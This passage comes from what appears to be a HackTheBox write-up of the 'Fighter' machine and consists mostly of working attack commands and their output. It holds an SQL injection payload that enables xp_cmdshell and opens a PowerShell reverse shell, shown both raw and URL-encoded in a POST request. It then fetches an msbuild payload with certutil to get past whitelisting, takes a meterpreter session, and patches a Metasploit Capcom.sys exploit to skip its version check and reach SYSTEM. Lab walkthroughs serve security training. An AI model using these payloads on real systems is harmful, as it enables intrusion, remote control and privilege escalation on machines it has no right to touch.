<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure <span class="string">&#x27;xP_cmDsHell&#x27;</span>, 1;RECONFIGURE WITH OVERRIDE;drop table <span class="comment">#xxx;create table #xxx (out varchar(8000));Insert into #xxx (out) execute xp_CmDShell &#x27;c:\WinDOWS\SYSWoW64\winDoWSpOwERsHEll\V1.0\PoWerShell.EXE &quot;$client = New-Object System.Net.Sockets.TCPClient(\&quot;10.10.14.3\&quot;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \&quot;PS \&quot; + (pwd).Path + \&quot;^&gt; \&quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;&#x27;;EXEC sp_configure &#x27;xp_cmDsHeLl&#x27;, 0;RECONFIGURE WITH OVERRIDE;</span></span><br></pre></td></tr></table></figure>

<p>url encode the payload then send the request</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /old/verify.asp HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: members.streetfighterclub.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://members.streetfighterclub.htb/old/login.asp</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 2627</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDASBDQAST=HDDPOADAMCOKAMNDGOGAFGGL</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456&amp;logintype=%31%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%20%31%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%78%50%5f%63%6d%44%73%48%65%6c%6c%27%2c%20%31%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b%64%72%6f%70%20%74%61%62%6c%65%20%23%78%78%78%3b%63%72%65%61%74%65%20%74%61%62%6c%65%20%23%78%78%78%20%28%6f%75%74%20%76%61%72%63%68%61%72%28%38%30%30%30%29%29%3b%49%6e%73%65%72%74%20%69%6e%74%6f%20%23%78%78%78%20%28%6f%75%74%29%20%65%78%65%63%75%74%65%20%78%70%5f%43%6d%44%53%68%65%6c%6c%20%27%63%3a%5c%57%69%6e%44%4f%57%53%5c%53%59%53%57%6f%57%36%34%5c%77%69%6e%44%6f%57%53%70%4f%77%45%52%73%48%45%6c%6c%5c%56%31%2e%30%5c%50%6f%57%65%72%53%68%65%6c%6c%2e%45%58%45%20%22%24%63%6c%69%65%6e%74%20%3d%20%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%53%6f%63%6b%65%74%73%2e%54%43%50%43%6c%69%65%6e%74%28%5c%22%31%30%2e%31%30%2e%31%34%2e%33%5c%22%2c%38%30%29%3b%24%73%74%72%65%61%6d%20%3d%20%24%63%6c%69%65%6e%74%2e%47%65%74%53%74%72%65%61%6d%28%29%3b%5b%62%79%74%65%5b%5d%5d%24%62%79%74%65%73%20%3d%20%30%2e%2e%36%35%35%33%35%7c%25%7b%30%7d%3b%77%68%69%6c%65%28%28%24%69%20%3d%20%24%73%74%72%65%61%6d%2e%52%65%61%64%28%24%62%79%74%65%73%2c%20%30%2c%20%24%62%79%74%65%73%2e%4c%65%6e%67%74%68%29%29%20%2d%6e%65%20%30%29%7b%3b%24%64%61%74%61%20%3d%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%2d%54%79%70%65%4e%61%6d%65%20%53%79%73%74%65%6d%2e%54%65%78%74%2e%41%53%43%49%49%45%6e%63%6f%64%69%6e%67%29%2e%47%65%74%53%74%72%69%6e%67%28%24%62%79%74%65%73%2c%30%2c%20%24%69%29%3b%24%73%65%6e%64%62%61%63%6b%20%3d%20%28%69%65%78%20%24%64%61%74%61%20%32%3e%26%31%20%7c%20%4f%75%74%2d%53%74%72%69%6e%67%20%29%3b%24%73%65%6e%64%62%61%63%6b%32%20%3d%20%24%73%65%6e%64%62%61%63%6b%20%2b%20%5c%22%50%53%20%5c%22%20%2b%20%28%70%77%64%29%2e%50%61%74%68%20%2b%20%5c%22%5e%3e%20%5c%22%3b%24%73%65%6e%64%62%79%74%65%20%3d%20%28%5b%74%65%78%74%2e%65%6e%63%6f%64%69%6e%67%5d%3a%3a%41%53%43%49%49%29%2e%47%65%74%42%79%74%65%73%28%24%73%65%6e%64%62%61%63%6b%32%29%3b%24%73%74%72%65%61%6d%2e%57%72%69%74%65%28%24%73%65%6e%64%62%79%74%65%2c%30%2c%24%73%65%6e%64%62%79%74%65%2e%4c%65%6e%67%74%68%29%3b%24%73%74%72%65%61%6d%2e%46%6c%75%73%68%28%29%7d%3b%24%63%6c%69%65%6e%74%2e%43%6c%6f%73%65%28%29%22%27%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%78%70%5f%63%6d%44%73%48%65%4c%6c%27%2c%20%30%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b&amp;B1=LogIn</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># nc -lvp 80</span></span><br><span class="line">listening on [any] 80 ...</span><br><span class="line">connect to [10.10.14.3] from streetfighterclub.htb [10.10.10.72] 49173</span><br><span class="line"><span class="built_in">whoami</span>                                          </span><br><span class="line">fighter\sqlserv</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>We are not able to find anything on the target machine. So we try to convert our shell into meterpreter but are unable to run any exe file. So there was a firewall that didn’t allow us to run any exe file. We got a reference through this link on how to bypass this. We use the nps payload to create an XML file that will contain our payload (download from following)</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvbnBzX3BheWxvYWQ=">nps payload<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/nps_payload-master<span class="comment"># python nps_payload.py </span></span><br><span class="line"></span><br><span class="line">                                     (            (</span><br><span class="line">                              ) (    )\        )  )\ )</span><br><span class="line">  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(</span><br><span class="line">  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)</span><br><span class="line"> _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |</span><br><span class="line">| &#x27; \)) <span class="string">&#x27;_ \|_-&lt;    | &#x27;</span>_ \) _` | || | / _ \/ _` / _` |</span><br><span class="line">|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|</span><br><span class="line">      |_|     |_____|_|         |__/</span><br><span class="line"></span><br><span class="line">                       v1.03</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        (1)     Generate msbuild/nps/msf payload</span><br><span class="line">        (2)     Generate msbuild/nps/msf HTA payload</span><br><span class="line">        (99)    Quit</span><br><span class="line"></span><br><span class="line">Select a task: 1</span><br><span class="line"></span><br><span class="line">Payload Selection:</span><br><span class="line"></span><br><span class="line">        (1)     windows/meterpreter/reverse_tcp</span><br><span class="line">        (2)     windows/meterpreter/reverse_http</span><br><span class="line">        (3)     windows/meterpreter/reverse_https</span><br><span class="line">        (4)     Custom PS1 Payload</span><br><span class="line"></span><br><span class="line">Select payload: 1</span><br><span class="line">Enter Your Local IP Address (None): 10.10.14.3</span><br><span class="line">Enter the listener port (443): 443</span><br><span class="line">[*] Generating PSH Payload...</span><br><span class="line">[*] Generating MSF Resource Script...</span><br><span class="line">[+] Metasploit resource script written to msbuild_nps.rc                                                </span><br><span class="line">[+] Payload written to msbuild_nps.xml</span><br><span class="line"></span><br><span class="line">1. Run <span class="string">&quot;msfconsole -r msbuild_nps.rc&quot;</span> to start listener.</span><br><span class="line">2. Choose a Deployment Option (a or b): - See README.md <span class="keyword">for</span> more information.</span><br><span class="line">  a. Local File Deployment:</span><br><span class="line">    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe &lt;folder_path_here&gt;\msbuild_nps.xml</span><br><span class="line">  b. Remote File Deployment:</span><br><span class="line">    - wmiexec.py &lt;USER&gt;:<span class="string">&#x27;&lt;PASS&gt;&#x27;</span>@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml                                                                          </span><br><span class="line">3. Hack the Planet!!</span><br></pre></td></tr></table></figure>

<p>We move into “c:\users\sqlserv” as we have a shell as user sqlserv.</p>
<p>run the command provided by npc payload to start our listener</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole -r /root/nps_payload-master/msbuild_nps.rc</span></span><br><span class="line">                                                  </span><br><span class="line">                          <span class="comment">########                  #</span></span><br><span class="line">                      <span class="comment">#################            #</span></span><br><span class="line">                   <span class="comment">######################         #</span></span><br><span class="line">                  <span class="comment">#########################      #</span></span><br><span class="line">                <span class="comment">############################</span></span><br><span class="line">               <span class="comment">##############################</span></span><br><span class="line">               <span class="comment">###############################</span></span><br><span class="line">              <span class="comment">###############################</span></span><br><span class="line">              <span class="comment">##############################</span></span><br><span class="line">                              <span class="comment">#    ########   #</span></span><br><span class="line">                 <span class="comment">##        ###        ####   ##</span></span><br><span class="line">                                      <span class="comment">###   ###</span></span><br><span class="line">                                    <span class="comment">####   ###</span></span><br><span class="line">               <span class="comment">####          ##########   ####</span></span><br><span class="line">               <span class="comment">#######################   ####</span></span><br><span class="line">                 <span class="comment">####################   ####</span></span><br><span class="line">                  <span class="comment">##################  ####</span></span><br><span class="line">                    <span class="comment">############      ##</span></span><br><span class="line">                       <span class="comment">########        ###</span></span><br><span class="line">                      <span class="comment">#########        #####</span></span><br><span class="line">                    <span class="comment">############      ######</span></span><br><span class="line">                   <span class="comment">########      #########</span></span><br><span class="line">                     <span class="comment">#####       ########</span></span><br><span class="line">                       <span class="comment">###       #########</span></span><br><span class="line">                      <span class="comment">######    ############</span></span><br><span class="line">                     <span class="comment">#######################</span></span><br><span class="line">                     <span class="comment">#   #   ###  #   #   ##</span></span><br><span class="line">                     <span class="comment">########################</span></span><br><span class="line">                      <span class="comment">##     ##   ##     ##</span></span><br><span class="line">                            https://metasploit.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.71-dev                          ]</span><br><span class="line">+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">[*] Processing /root/nps_payload-master/msbuild_nps.rc <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; use multi/handler</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> LHOST 10.10.14.3</span><br><span class="line">LHOST =&gt; 10.10.14.3</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; exploit -j -z</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:443</span><br></pre></td></tr></table></figure>
<p>start our python HTTP Server to send our file to the target machine</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ls</span></span><br><span class="line">exploit.py  msbuild_nps.xml  ports</span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br></pre></td></tr></table></figure>

<p>download the file using certutil.exe on the target machine</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\sqlserv&gt; certutil.exe -urlcache -<span class="built_in">split</span> -f http://10.10.14.3/msbuild_nps.xml msbuild_nps.xml</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1526</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\<span class="built_in">users</span>\sqlserv&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\sqlserv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime     Length Name                              </span><br><span class="line">----                -------------     ------ ----                              </span><br><span class="line">d-r--        03/11/2017     14:11            Contacts                          </span><br><span class="line">d-r--        03/11/2017     14:11            Desktop                           </span><br><span class="line">d-r--        03/11/2017     14:11            Documents                         </span><br><span class="line">d-r--        03/11/2017     14:11            Downloads                         </span><br><span class="line">d-r--        03/11/2017     14:11            Favorites                         </span><br><span class="line">d-r--        03/11/2017     14:11            Links                             </span><br><span class="line">d-r--        03/11/2017     14:11            Music                             </span><br><span class="line">d-r--        03/11/2017     14:11            Pictures                          </span><br><span class="line">d-r--        03/11/2017     14:11            Saved Games                       </span><br><span class="line">d-r--        03/11/2017     14:11            Searches                          </span><br><span class="line">d-r--        03/11/2017     14:11            Videos                            </span><br><span class="line">-a---        04/06/2020     05:55       5414 msbuild_nps.xml</span><br></pre></td></tr></table></figure>

<p>then run the XML file we uploaded using msbuild.exe</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\sqlserv&gt; c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe msbuild_nps.xml</span><br></pre></td></tr></table></figure>

<p>then we got a meterpreter shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure>

<p>To convert 32-bit session into 64-bit session, we check the processes and find the 64-bit running process. We then migrate our process to a 64-bit process and get a 64-bit session.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">2920  1188  cmd.exe                  x64   0        FIGHTER\sqlserv  C:\Windows\System32\cmd.exe</span><br><span class="line">meterpreter &gt; migrate 2920</span><br><span class="line">[*] Migrating from 1800 to 2920...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>

<p>fantastic!!!</p>
<p>still don’t find anything to escalate our privilege. As this machine on street fighter game, we try to google street fighter exploit and find that street fighter 5 has privilege escalation vulnerability. We find that street fighter has a service called Capcom, so we check if street fighter 5 is installed on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1044 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.3.9600]</span><br><span class="line">(c) 2013 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\<span class="built_in">users</span>\sqlserv\desktop&gt;sc query capcom</span><br><span class="line">sc query capcom</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: capcom </span><br><span class="line">        TYPE               : 1  KERNEL_DRIVER  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>

<p>We find this Metasploit exploit here, we try to run it but are unable to get a shell as it gave an error stating that the system was not vulnerable. So we make changes to the code and comment out the section where it checks the OS version.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># searchsploit capcom</span></span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                          |  Path</span><br><span class="line">                                                                        | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Street Fighter 5 - <span class="string">&#x27;Capcom.sys&#x27;</span> Kernel Execution (Metasploit)           | exploits/windows_x86-64/local/40451.rb</span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>now edit the payload, add “#” at the beginning of the line</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span>  =&gt; <span class="string">&#x27;Jan 01 1999&#x27;</span>, <span class="comment"># non-vuln exploit date</span></span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>   =&gt; 0</span><br><span class="line">  &#125;))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def check</span><br><span class="line">  <span class="comment">#if sysinfo[&#x27;OS&#x27;] !~ /windows (7|8|10)/i</span></span><br><span class="line">    <span class="comment">#return Exploit::CheckCode::Unknown</span></span><br><span class="line">  <span class="comment">#end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> sysinfo[<span class="string">&#x27;Architecture&#x27;</span>] !~ /(wow|x)64/i</span><br><span class="line">    <span class="built_in">return</span> Exploit::CheckCode::Safe</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>

<p>now run the exploit again</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/capcom_sys_exec</span><br><span class="line">msf exploit(windows/local/capcom_sys_exec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/local/capcom_sys_exec) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">msf exploit(windows/local/capcom_sys_exec) &gt; <span class="built_in">set</span> lport 80</span><br><span class="line">msf exploit(windows/local/capcom_sys_exec) &gt; <span class="built_in">set</span> session 2</span><br><span class="line">msf exploit(windows/local/capcom_sys_exec)&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:80 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2592 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2592...</span><br><span class="line">[*] Injecting exploit into 2592...</span><br><span class="line">[*] Exploit injected. Injecting payload into 2592...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, <span class="built_in">wait</span> <span class="keyword">for</span> (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (206403 bytes) to 10.10.10.72</span><br><span class="line">[*] Meterpreter session 3 opened (10.10.14.3:80 -&gt; 10.10.10.72:49187) at 2020-06-04 00:27:24 -0400</span><br></pre></td></tr></table></figure>

<p>now we got system privilege</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>then enter a shell and find the flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 120 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 6.3.9600]</span><br><span class="line">(c) 2013 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">cd</span> c:\<span class="built_in">users</span>\decoder\Desktop</span><br><span class="line"><span class="built_in">cd</span> c:\<span class="built_in">users</span>\decoder\Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\decoder\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE85-B9AE</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\decoder\Desktop</span><br><span class="line"></span><br><span class="line">02/05/2018  17:28    &lt;DIR&gt;          .</span><br><span class="line">02/05/2018  17:28    &lt;DIR&gt;          ..</span><br><span class="line">08/01/2018  21:47                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)  23.804.547.072 bytes free</span><br><span 